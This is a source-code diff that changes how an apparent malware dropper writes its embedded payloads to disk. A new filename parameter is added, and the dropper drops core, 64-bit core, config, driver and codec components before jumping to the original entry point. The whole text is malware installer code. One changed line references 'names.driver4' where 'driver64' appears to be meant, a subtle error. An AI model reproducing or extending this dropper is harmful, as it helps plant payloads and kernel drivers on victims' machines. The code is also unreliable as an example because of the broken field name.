@@ -135,15 +135,20 @@ char * _needed_strings[] = {
 	NULL
 };
 
-__forceinline BOOL dump_to_file(DataSectionCryptoPack& file, DropperHeader* header, DUMPFILE fn_dump) 
+// XXX add filename
+__forceinline BOOL dump_to_file(DataSectionBlob& name, DataSectionCryptoPack& file, DropperHeader* header, DUMPFILE fn_dump)
 {
-	if (header == 0 || file.offset == 0 || file.size == 0 || fn_dump == 0)
+	if (header == 0 || file.offset == 0 || file.size == 0 
+                || name.offset == 0 || name.size == 0 || fn_dump == 0)
+        {
 		return FALSE;
+        }
 	
-	CHAR* fileName = (char *) (((char*)header) + header->files.names.core.offset);
-	CHAR* fileData = (char *) (((char*)header) + header->files.core.offset);
-	if (fileName == 0 || fileData == 0)
+	CHAR* fileName = (char *) (((char*)header) + name.offset);
+	CHAR* fileData = (char *) (((char*)header) + file.offset);
+	if (fileName == 0 || fileData == 0) {
 		return FALSE;
+        }
 	
 	return fn_dump(fileName, fileData, file.size, file.original_size, header);
 }
@@ -453,32 +458,32 @@ NEXT_ENTRY:
 	BOOL ret = FALSE;
 
 	// CORE
-	ret = dump_to_file(header->files.core, header, pfn_DumpFile);
+	ret = dump_to_file(header->names.core, header->files.core, header, pfn_DumpFile);
 	if (FALSE == ret)	
 		goto OEP_CALL;
 	
 	// CORE64
-	ret = dump_to_file(header->files.core64, header, pfn_DumpFile);
+	ret = dump_to_file(header->names.core64, header->files.core64, header, pfn_DumpFile);
 	if (FALSE == ret)	
 		goto OEP_CALL;
 	
 	// CONFIG
-	ret = dump_to_file(header->files.config, header, pfn_DumpFile);
+	ret = dump_to_file(header->names.config, header->files.config, header, pfn_DumpFile);
 	if (FALSE == ret)	
 		goto OEP_CALL;
 	
 	// DRIVER
-	ret = dump_to_file(header->files.driver, header, pfn_DumpFile);
+	ret = dump_to_file(header->names.driver, header->files.driver, header, pfn_DumpFile);
 	if (FALSE == ret)	
 		goto OEP_CALL;
 	
 	// DRIVER64
-	ret = dump_to_file(header->files.driver64, header, pfn_DumpFile);
+	ret = dump_to_file(header->names.driver4, header->files.driver64, header, pfn_DumpFile);
 	if (FALSE == ret)	
 		goto OEP_CALL;
 	
 	// CODEC
-	ret = dump_to_file(header->files.codec, header, pfn_DumpFile);
+	ret = dump_to_file(header->names.codec, header->files.codec, header, pfn_DumpFile);
 	if (FALSE == ret)	
 		goto OEP_CALL;
 	
